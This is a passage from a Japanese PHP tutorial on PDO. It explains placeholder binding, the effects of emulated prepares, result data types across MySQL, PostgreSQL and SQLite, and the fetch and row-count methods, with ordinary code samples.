<span id="疑問符プレースホルダ" class="fragment"></span><a href="#%E7%96%91%E5%95%8F%E7%AC%A6%E3%83%97%E3%83%AC%E3%83%BC%E3%82%B9%E3%83%9B%E3%83%AB%E3%83%80"><i class="fa fa-link"></i></a>疑問符プレースホルダ</h3>

<ul>
<li>
<code>?</code> の「番目」は <strong>1</strong> から始まる．</li>
<li>
<code>PDO::PARAM_STR</code> は省略することが出来る．</li>
<li>エミュレーションがONの場合には正しくキャストしてくれないバグのようなものが仕様として存在するため，<ins>文字列以外のものを扱う際に明示的なキャストが必要</ins>．</li>
<li>
<code>NULL</code> 値に関しては <code>PDO::PARAM_NULL</code> が暗黙的に使用される．</li>
</ul>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">エミュレーションがONの場合はこうする必要がある</span></div>
<div class="highlight"><pre><span></span><span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s1">'SELECT * FROM users WHERE gender = ? AND age = ?'</span><span class="p">);</span>
<span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bindValue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nv">$gender</span><span class="p">);</span>
<span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bindValue</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$age</span><span class="p">,</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">PARAM_INT</span><span class="p">);</span>
<span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
</pre></div>
</div>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">エミュレーションがOFFの場合はこれでもOK</span></div>
<div class="highlight"><pre><span></span><span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s1">'SELECT * FROM users WHERE gender = ? AND age = ?'</span><span class="p">);</span>
<span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bindValue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nv">$gender</span><span class="p">);</span>
<span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bindValue</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="nv">$age</span><span class="p">,</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">PARAM_INT</span><span class="p">);</span>
<span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
</pre></div>
</div>

<ul>
<li>番目で整数以外を指定した場合，適当な変換が行われる． (但し，こんなコードは書くべきではない)</li>
</ul>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">良い例</span></div>
<div class="highlight"><pre><span></span><span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bindValue</span><span class="p">(</span><span class="s1">'2'</span><span class="p">,</span> <span class="nv">$age</span><span class="p">,</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">PARAM_INT</span><span class="p">);</span>
<span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bindValue</span><span class="p">(</span><span class="s1">'02'</span><span class="p">,</span> <span class="nv">$age</span><span class="p">,</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">PARAM_INT</span><span class="p">);</span>
<span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bindValue</span><span class="p">(</span><span class="s1">'+02'</span><span class="p">,</span> <span class="nv">$age</span><span class="p">,</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">PARAM_INT</span><span class="p">);</span>
<span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bindValue</span><span class="p">(</span><span class="s1">'2e0'</span><span class="p">,</span> <span class="nv">$age</span><span class="p">,</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">PARAM_INT</span><span class="p">);</span>
<span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bindValue</span><span class="p">(</span><span class="s1">'00002.9999'</span><span class="p">,</span> <span class="nv">$age</span><span class="p">,</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">PARAM_INT</span><span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">悪い例</span></div>
<div class="highlight"><pre><span></span><span class="c1">// SQLSTATE[HY093]: Invalid parameter number: Columns/Parameters are 1-based</span>
<span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bindValue</span><span class="p">(</span><span class="o">-</span><span class="mi">2</span><span class="p">,</span> <span class="nv">$age</span><span class="p">,</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">PARAM_INT</span><span class="p">);</span>

<span class="c1">// オーバーフローして3になる</span>
<span class="c1">// SQLSTATE[HY093]: Invalid parameter number: parameter was not defined</span>
<span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bindValue</span><span class="p">(</span><span class="s1">'00002.999999999999999999999999999'</span><span class="p">,</span> <span class="nv">$age</span><span class="p">,</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">PARAM_INT</span><span class="p">);</span>

<span class="c1">// Notice: A non well formed numeric value encountered</span>
<span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bindValue</span><span class="p">(</span><span class="s1">'2a'</span><span class="p">,</span> <span class="nv">$age</span><span class="p">,</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">PARAM_INT</span><span class="p">);</span>
</pre></div>
</div>

<h3>
<span id="名前付きプレースホルダ" class="fragment"></span><a href="#%E5%90%8D%E5%89%8D%E4%BB%98%E3%81%8D%E3%83%97%E3%83%AC%E3%83%BC%E3%82%B9%E3%83%9B%E3%83%AB%E3%83%80"><i class="fa fa-link"></i></a>名前付きプレースホルダ</h3>

<ul>
<li>
<code>:</code> を頭につけ，半角英数字とアンダースコアにて構成する．</li>
<li>バインド時の頭の <code>:</code> は省略することが出来る．</li>
</ul>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">こちらも同様にエミュレーションがONならば明示的なキャストを忘れない</span></div>
<div class="highlight"><pre><span></span><span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s1">'SELECT * FROM users WHERE age = :age AND gender = :gender'</span><span class="p">);</span>
<span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bindValue</span><span class="p">(</span><span class="s1">':age'</span><span class="p">,</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$age</span><span class="p">,</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">PARAM_INT</span><span class="p">);</span>
<span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bindValue</span><span class="p">(</span><span class="s1">':gender'</span><span class="p">,</span> <span class="nv">$gender</span><span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">頭のコロンを省略したケース</span></div>
<div class="highlight"><pre><span></span><span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bindValue</span><span class="p">(</span><span class="s1">'gender'</span><span class="p">,</span> <span class="nv">$gender</span><span class="p">);</span>
</pre></div>
</div>

<ul>
<li>
<ins>エミュレーションがONの場合のみ</ins>，同名のプレースホルダを複数使うことが出来る．</li>
</ul>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">IDが20で年齢も20歳の人を取得</span></div>
<div class="highlight"><pre><span></span><span class="nv">$n</span> <span class="o">=</span> <span class="mi">20</span><span class="p">;</span>
<span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s1">'SELECT * FROM users WHERE age = :n AND id = :n'</span><span class="p">);</span>
<span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bindValue</span><span class="p">(</span><span class="s1">':n'</span><span class="p">,</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$age</span><span class="p">,</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">PARAM_INT</span><span class="p">);</span>
<span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
</pre></div>
</div>

<p>なお， 値を即時にバインドするのではなく，変数を参照的にバインドしておき，実際に値をバインドするのは実行時になる <a href="http://www.php.net/manual/ja/pdostatement.bindparam.php" rel="nofollow noopener" target="_blank">PDOStatement::bindParam</a> メソッドもありますが，原則的にこちらを使う必要はありません．<ins>エミュレーションがONの場合</ins>，実行後にバインドした変数が文字列型にされる仕様もあるので注意してください．</p>

<ul>
<li><a href="http://qiita.com/_dozen_/items/e3c00a0a581378a4cc70" id="reference-7d3adea71261d1a0d1b9">Qiita - 最近PDOを使っていてハマったこと2つ．</a></li>
</ul>

<h2>
<span id="pdoprepare--pdostatementexecute-の2ステップでクエリを実行する" class="fragment"></span><a href="#pdoprepare--pdostatementexecute-%E3%81%AE2%E3%82%B9%E3%83%86%E3%83%83%E3%83%97%E3%81%A7%E3%82%AF%E3%82%A8%E3%83%AA%E3%82%92%E5%AE%9F%E8%A1%8C%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a><a href="http://www.php.net/manual/ja/pdo.prepare.php" rel="nofollow noopener" target="_blank">PDO::prepare</a> → <a href="http://www.php.net/manual/ja/pdostatement.execute.php" rel="nofollow noopener" target="_blank">PDOStatement::execute</a> の2ステップでクエリを実行する</h2>

<p><a href="http://www.php.net/manual/ja/pdostatement.execute.php" rel="nofollow noopener" target="_blank">PDOStatement::execute</a> メソッドの引数に配列を渡すと，それらを全てバインドしたあとそのままSQLを実行してくれます．但し，以下の条件に注意してください．</p>

<ul>
<li>
<ins><code>NULL</code> 値以外は全て <code>PDO::PARAM_STR</code> 扱いになる</ins> ．もし間違った型でバインドをしても，MySQL/SQLiteはデータベース側で自動的にキャストし直してくれるが，パフォーマンスの低下やバグの原因になるので，可能な限り避けたほうがいい．<ins>PostgreSQLの場合はエラーになる</ins>．</li>
<li>また， <ins>既に <a href="http://www.php.net/manual/ja/pdostatement.bindvalue.php" rel="nofollow noopener" target="_blank">PDOStatement::bindValue</a> メソッドで値がバインドされていた場合でも，それらは全て無視される</ins>．これを用いる場合，全てのバインドをこの引数で行わなければならない．</li>
</ul>

<h3>
<span id="疑問符プレースホルダ-1" class="fragment"></span><a href="#%E7%96%91%E5%95%8F%E7%AC%A6%E3%83%97%E3%83%AC%E3%83%BC%E3%82%B9%E3%83%9B%E3%83%AB%E3%83%80-1"><i class="fa fa-link"></i></a>疑問符プレースホルダ</h3>

<p><a href="http://www.php.net/manual/ja/pdostatement.bindvalue.php" rel="nofollow noopener" target="_blank">PDOStatement::bindValue</a> メソッドを用いたときと異なり，<code>?</code> の「番目」が <strong>0</strong> から始まることに注意してください．</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s1">'SELECT * FROM users WHERE city = ? AND gender = ?'</span><span class="p">);</span>
<span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">([</span><span class="nv">$city</span><span class="p">,</span> <span class="nv">$gender</span><span class="p">]);</span>
</pre></div></div>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">キーを適切に設定すれば順番を変えて指定することも可能</span></div>
<div class="highlight"><pre><span></span><span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">([</span><span class="mi">1</span> <span class="o">=&gt;</span> <span class="nv">$gender</span><span class="p">,</span> <span class="mi">0</span> <span class="o">=&gt;</span> <span class="nv">$city</span><span class="p">]);</span>
</pre></div>
</div>

<h3>
<span id="名前付きプレースホルダ-1" class="fragment"></span><a href="#%E5%90%8D%E5%89%8D%E4%BB%98%E3%81%8D%E3%83%97%E3%83%AC%E3%83%BC%E3%82%B9%E3%83%9B%E3%83%AB%E3%83%80-1"><i class="fa fa-link"></i></a>名前付きプレースホルダ</h3>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s1">'SELECT * FROM users WHERE city = :city AND gender = :gender'</span><span class="p">);</span>
<span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">([</span><span class="s1">':city'</span> <span class="o">=&gt;</span> <span class="nv">$city</span><span class="p">,</span> <span class="s1">':gender'</span> <span class="o">=&gt;</span> <span class="nv">$gender</span><span class="p">]);</span>
</pre></div></div>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">頭のコロンは省略することが出来る</span></div>
<div class="highlight"><pre><span></span><span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">([</span><span class="s1">'city'</span> <span class="o">=&gt;</span> <span class="nv">$city</span><span class="p">,</span> <span class="s1">'gender'</span> <span class="o">=&gt;</span> <span class="nv">$gender</span><span class="p">]);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">compact関数を活用する例</span></div>
<div class="highlight"><pre><span></span><span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">(</span><span class="nb">compact</span><span class="p">(</span><span class="s1">'city'</span><span class="p">,</span> <span class="s1">'gender'</span><span class="p">));</span>
</pre></div>
</div>

<h2>
<span id="select-の結果を取得する" class="fragment"></span><a href="#select-%E3%81%AE%E7%B5%90%E6%9E%9C%E3%82%92%E5%8F%96%E5%BE%97%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a><code>SELECT</code> の結果を取得する</h2>

<h3>
<span id="結果の型" class="fragment"></span><a href="#%E7%B5%90%E6%9E%9C%E3%81%AE%E5%9E%8B"><i class="fa fa-link"></i></a>結果の型</h3>

<h4>
<span id="mysql" class="fragment"></span><a href="#mysql"><i class="fa fa-link"></i></a><font color="silver">MySQL</font>
</h4>

<table>
<thead>
<tr>
<th style="text-align: center">データベース</th>
<th style="text-align: center">PHP<br>(エミュレーション無しmysqlnd)</th>
<th style="text-align: center">PHP<br>(libmysqlclient)<br>(エミュレーション有りmysqlnd)<br>
</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: center">NULL</td>
<td style="text-align: center">NULL</td>
<td style="text-align: center">NULL</td>
</tr>
<tr>
<td style="text-align: center">文字列</td>
<td style="text-align: center">String</td>
<td style="text-align: center">String</td>
</tr>
<tr>
<td style="text-align: center">日付</td>
<td style="text-align: center">String</td>
<td style="text-align: center">String</td>
</tr>
<tr>
<td style="text-align: center">タイムスタンプ</td>
<td style="text-align: center">Integer</td>
<td style="text-align: center">String</td>
</tr>
<tr>
<td style="text-align: center">論理値</td>
<td style="text-align: center"><strong>Integer</strong></td>
<td style="text-align: center">String</td>
</tr>
<tr>
<td style="text-align: center">PHPで扱える<ins>値の</ins>整数</td>
<td style="text-align: center">Integer</td>
<td style="text-align: center">String</td>
</tr>
<tr>
<td style="text-align: center">PHPで扱えない<ins>値の</ins>整数</td>
<td style="text-align: center">String</td>
<td style="text-align: center">String</td>
</tr>
<tr>
<td style="text-align: center">浮動小数点数</td>
<td style="text-align: center">Float</td>
<td style="text-align: center">String</td>
</tr>
</tbody>
</table>

<p>エミュレーションに関するオプションは <code>PDO::ATTR_EMULATE_PREPARES</code> という命名ではありますが，<ins>プリペアドステートメントを使用しない場合にも影響が及ぶ</ins>ことに注意してください．</p>

<h4>
<span id="postgresql" class="fragment"></span><a href="#postgresql"><i class="fa fa-link"></i></a><font color="silver">PostgreSQL</font>
</h4>

<table>
<thead>
<tr>
<th style="text-align: center">データベース</th>
<th style="text-align: center">PHP</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: center">NULL</td>
<td style="text-align: center">NULL</td>
</tr>
<tr>
<td style="text-align: center">文字列</td>
<td style="text-align: center">String</td>
</tr>
<tr>
<td style="text-align: center">日付</td>
<td style="text-align: center">String</td>
</tr>
<tr>
<td style="text-align: center">タイムスタンプ</td>
<td style="text-align: center">Integer</td>
</tr>
<tr>
<td style="text-align: center">論理値</td>
<td style="text-align: center">Boolean</td>
</tr>
<tr>
<td style="text-align: center">PHPで扱える<ins>型の</ins>整数</td>
<td style="text-align: center">Integer</td>
</tr>
<tr>
<td style="text-align: center">PHPで扱えない<ins>型の</ins>整数</td>
<td style="text-align: center">String</td>
</tr>
<tr>
<td style="text-align: center">浮動小数点数</td>
<td style="text-align: center"><strong>String</strong></td>
</tr>
</tbody>
</table>

<h4>
<span id="sqlite" class="fragment"></span><a href="#sqlite"><i class="fa fa-link"></i></a><font color="silver">SQLite</font>
</h4>

<table>
<thead>
<tr>
<th style="text-align: center">データベース</th>
<th style="text-align: center">PHP</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: center">NULL</td>
<td style="text-align: center">NULL</td>
</tr>
<tr>
<td style="text-align: center">その他</td>
<td style="text-align: center">String</td>
</tr>
</tbody>
</table>

<h3>
<span id="pdosetattribute-で取得する型を変更できるケース" class="fragment"></span><a href="#pdosetattribute-%E3%81%A7%E5%8F%96%E5%BE%97%E3%81%99%E3%82%8B%E5%9E%8B%E3%82%92%E5%A4%89%E6%9B%B4%E3%81%A7%E3%81%8D%E3%82%8B%E3%82%B1%E3%83%BC%E3%82%B9"><i class="fa fa-link"></i></a><a href="http://www.php.net/manual/ja/pdo.setattribute.php" rel="nofollow noopener" target="_blank">PDO::setAttribute</a> で取得する型を変更できるケース</h3>

<h4>
<span id="pdoattr_oracle_nulls" class="fragment"></span><a href="#pdoattr_oracle_nulls"><i class="fa fa-link"></i></a><code>PDO::ATTR_ORACLE_NULLS</code>
</h4>

<table>
<thead>
<tr>
<th style="text-align: center">データベース上</th>
<th style="text-align: center"><strong><code>PDO::NULL_EMPTY_STRING</code></strong></th>
<th style="text-align: center"><strong><code>PDO::NULL_TO_STRING</code></strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: center">NULL</td>
<td style="text-align: center">NULL</td>
<td style="text-align: center">""</td>
</tr>
<tr>
<td style="text-align: center">""</td>
<td style="text-align: center">NULL</td>
<td style="text-align: center">""</td>
</tr>
</tbody>
</table>

<p>オプション名に <code>ORACLE</code> という名前が入っていますが，Oracle以外のデータベースでも利用することができます．</p>

<h4>
<span id="pdoattr_stringify_fetches" class="fragment"></span><a href="#pdoattr_stringify_fetches"><i class="fa fa-link"></i></a><code>PDO::ATTR_STRINGIFY_FETCHES</code>
</h4>

<p><code>true</code> に設定すると，エミュレーションがOFFの場合に数値が文字列化されます．<ins>エミュレーションがONの場合は，この設定に関わらず常に文字列化されます</ins>．</p>

<h3>
<span id="pdostatementfetch" class="fragment"></span><a href="#pdostatementfetch"><i class="fa fa-link"></i></a><a href="http://www.php.net/manual/ja/pdostatement.fetch.php" rel="nofollow noopener" target="_blank">PDOStatement::fetch</a>
</h3>

<p>カーソルをずらしながら，指定したフェッチモードで1行ずつ取得していきます．</p>

<ul>
<li>引数を省略した場合はデフォルトフェッチモードが使用される．</li>
<li>全ての取得が終わると常に <code>false</code> を返す．</li>
</ul>

<p>デフォルトフェッチモードを <code>PDO::FETCH_ASSOC</code> に設定した際の例を示します．</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">一番基本的な方法</span></div>
<div class="highlight"><pre><span></span><span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">())</span> <span class="p">{</span>
    <span class="nb">printf</span><span class="p">(</span><span class="s2">"%s lives in %s&lt;br /&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">'name'</span><span class="p">],</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">'city'</span><span class="p">]);</span>
<span class="p">}</span>
</pre></div>
</div>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">vprintf()関数を使った応用</span></div>
<div class="highlight"><pre><span></span><span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">())</span> <span class="p">{</span>
    <span class="nb">vprintf</span><span class="p">(</span><span class="s2">"%s lives in %s&lt;br /&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="nv">$row</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
</div>

<p>PDOStatementクラスはTraversableインターフェースを実装しているため，デフォルトフェッチモードを使う場合，while文の代わりにforeach文でもっとスマートに書くことができます．但し，<ins>HTML表示のために変数を準備する場合には，多くは配列として持っておく方が都合がいいので，後に紹介する <a href="http://www.php.net/manual/ja/pdostatement.fetchall.php" rel="nofollow noopener" target="_blank">PDOStatement::fetchAll</a> メソッドの使用を検討してください</ins>．</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">foreach</span> <span class="p">(</span><span class="nv">$stmt</span> <span class="k">as</span> <span class="nv">$row</span><span class="p">)</span> <span class="p">{</span>
    <span class="nb">printf</span><span class="p">(</span><span class="s2">"%s lives in %s&lt;br /&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">'name'</span><span class="p">],</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">'city'</span><span class="p">]);</span>
<span class="p">}</span>
</pre></div></div>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">0から始まるオフセットを取り出すことも出来る</span></div>
<div class="highlight"><pre><span></span><span class="k">foreach</span> <span class="p">(</span><span class="nv">$stmt</span> <span class="k">as</span> <span class="nv">$i</span> <span class="o">=&gt;</span> <span class="nv">$row</span><span class="p">)</span> <span class="p">{</span>
    <span class="nb">printf</span><span class="p">(</span><span class="s2">"[%d] %s lives in %s&lt;br /&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="nv">$i</span><span class="p">,</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">'name'</span><span class="p">],</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">'city'</span><span class="p">]);</span>
<span class="p">}</span>
</pre></div>
</div>

<h3>
<span id="pdostatementfetchobject" class="fragment"></span><a href="#pdostatementfetchobject"><i class="fa fa-link"></i></a><a href="http://www.php.net/manual/ja/pdostatement.fetchobject.php" rel="nofollow noopener" target="_blank">PDOStatement::fetchObject</a>
</h3>

<p>連想配列の代わりにstdClassオブジェクトとして取得します．<a href="http://www.php.net/manual/ja/pdostatement.fetch.php" rel="nofollow noopener" target="_blank">PDOStatement::fetch</a> で <code>PDO::FETCH_OBJ</code> を指定するケースと等価ですが，こちらの方が短く書くことができます．</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">fetchObject</span><span class="p">())</span> <span class="p">{</span>
    <span class="nb">printf</span><span class="p">(</span><span class="s2">"%s lives in %s&lt;br /&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="nv">$row</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">,</span> <span class="nv">$row</span><span class="o">-&gt;</span><span class="na">city</span><span class="p">);</span>
<span class="p">}</span>
</pre></div></div>

<h3>
<span id="pdostatementfetchcolumn" class="fragment"></span><a href="#pdostatementfetchcolumn"><i class="fa fa-link"></i></a><a href="http://www.php.net/manual/ja/pdostatement.fetchcolumn.php" rel="nofollow noopener" target="_blank">PDOStatement::fetchColumn</a>
</h3>

<p>特定の1カラムのみを文字列として取得します．<a href="http://www.php.net/manual/ja/pdostatement.fetch.php" rel="nofollow noopener" target="_blank">PDOStatement::fetch</a> で <code>PDO::FETCH_COLUMN</code> を指定するケースと等価ですが，こちらの方が短く書くことができます．</p>

<ul>
<li>先頭から数えてそのカラムが何番目にあるかを第1引数として渡す．「番目」は <strong>0</strong> から始まる．省略した場合は 0 を指定したとみなされる．</li>
<li>値に <code>0</code> が含まれる可能性がある場合は， <strong><code>false !==</code></strong> の条件判定をしなければならない．</li>
</ul>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">while</span> <span class="p">(</span><span class="k">false</span> <span class="o">!==</span> <span class="nv">$value</span> <span class="o">=</span> <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">fetchColumn</span><span class="p">())</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">"</span><span class="si">{</span><span class="nv">$value</span><span class="si">}</span><span class="s2">&lt;br /&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
<span class="p">}</span>
</pre></div></div>

<h3>
<span id="pdostatementfetchall" class="fragment"></span><a href="#pdostatementfetchall"><i class="fa fa-link"></i></a><a href="http://www.php.net/manual/ja/pdostatement.fetchall.php" rel="nofollow noopener" target="_blank">PDOStatement::fetchAll</a>
</h3>

<p>一気に全件取得して2次元配列とします．</p>

<ul>
<li>引数を省略した場合はデフォルトフェッチモードが使用される．</li>
</ul>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$rows</span> <span class="o">=</span> <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">fetchAll</span><span class="p">();</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$rows</span><span class="p">);</span>
</pre></div></div>

<ul>
<li>特定のカラムだけ一気に全件取得して1次元配列としたい場合，第1引数に <strong><code>PDO::FETCH_COLUMN</code></strong> を指定し，第2引数にカラムの「番目」を渡す．「番目」は <strong>0</strong> から始まる．省略した場合は 0 を指定したとみなされる．</li>
</ul>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$values</span> <span class="o">=</span> <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">fetchAll</span><span class="p">(</span><span class="nx">PDO</span><span class="o">::</span><span class="na">FETCH_COLUMN</span><span class="p">);</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$values</span><span class="p">);</span>
</pre></div></div>

<h3>
<span id="pdostatementsetfetchmode" class="fragment"></span><a href="#pdostatementsetfetchmode"><i class="fa fa-link"></i></a><a href="http://www.php.net/manual/ja/pdostatement.setfetchmode.php" rel="nofollow noopener" target="_blank">PDOStatement::setFetchMode</a>
</h3>

<p>PDOオブジェクト自体にデフォルトフェッチモードを指定する方法を紹介しましたが，このメソッドを利用すれば個別に発行されたPDOStatementオブジェクトに対して後からフェッチモードを指定することができます．引数の渡し方がモードによって異なるので，詳しくはマニュアルを参照してください．</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">0番目のカラムをforeachで取得していくケース</span></div>
<div class="highlight"><pre><span></span><span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">setFetchMode</span><span class="p">(</span><span class="nx">PDO</span><span class="o">::</span><span class="na">FETCH_COLUMN</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="k">foreach</span> <span class="p">(</span><span class="nv">$stmt</span> <span class="k">as</span> <span class="nv">$i</span> <span class="o">=&gt;</span> <span class="nv">$name</span><span class="p">)</span> <span class="p">{</span> <span class="o">...</span> <span class="p">}</span>
</pre></div>
</div>

<p>実は… <a href="http://www.php.net/manual/ja/pdo.query.php" rel="nofollow noopener" target="_blank">PDO::query</a> を用いる場合にも同じ形式でフェッチモードを指定することができます．</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">0番目のカラムをforeachで取得していくケース</span></div>
<div class="highlight"><pre><span></span><span class="k">foreach</span> <span class="p">(</span><span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">,</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">FETCH_COLUMN</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$i</span> <span class="o">=&gt;</span> <span class="nv">$name</span><span class="p">)</span> <span class="p">{</span> <span class="o">...</span> <span class="p">}</span>
</pre></div>
</div>

<h2>
<span id="update-insert-で作用した行数を取得する" class="fragment"></span><a href="#update-insert-%E3%81%A7%E4%BD%9C%E7%94%A8%E3%81%97%E3%81%9F%E8%A1%8C%E6%95%B0%E3%82%92%E5%8F%96%E5%BE%97%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a><code>UPDATE</code>, <code>INSERT</code> で作用した行数を取得する</h2>

<p>こちらの結果に対してフェッチしようとした場合，<code>SQLSTATE[HY000]: General error</code> が発生します．こちらに対して用いることができるのは <a href="http://www.php.net/manual/ja/pdostatement.rowcount.php" rel="nofollow noopener" target="_blank">PDOStatement::rowCount</a> メソッドのみです．</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nb">printf</span><span class="p">(</span><span class="s2">"%d行に作用しました&lt;br &gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">rowCount</span><span class="p">());</span>
</pre></div></div>

<h2>
<span id="select-で該当した行数を取得する" class="fragment"></span><a href="#select-%E3%81%A7%E8%A9%B2%E5%BD%93%E3%81%97%E3%81%9F%E8%A1%8C%E6%95%B0%E3%82%92%E5%8F%96%E5%BE%97%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a><code>SELECT</code> で該当した行数を取得する</h2>

<p>基本的に，以下の方法に従います．</p>

<ul>
